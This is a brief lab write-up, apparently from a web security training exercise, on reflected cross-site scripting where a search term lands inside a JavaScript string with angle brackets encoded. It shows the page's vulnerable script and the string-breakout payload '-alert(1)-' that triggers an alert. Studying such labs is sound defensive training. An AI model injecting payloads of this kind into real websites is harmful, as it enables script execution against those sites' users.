# **Reflected XSS into a JavaScript string with angle brackets HTML encoded**

The search is being reflected into a JS variable

```
<script>
    var searchTerms = ''-alert(1)-'';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

So if I use a payload like '-alert(1)-' it will add it to the page and show the alert.
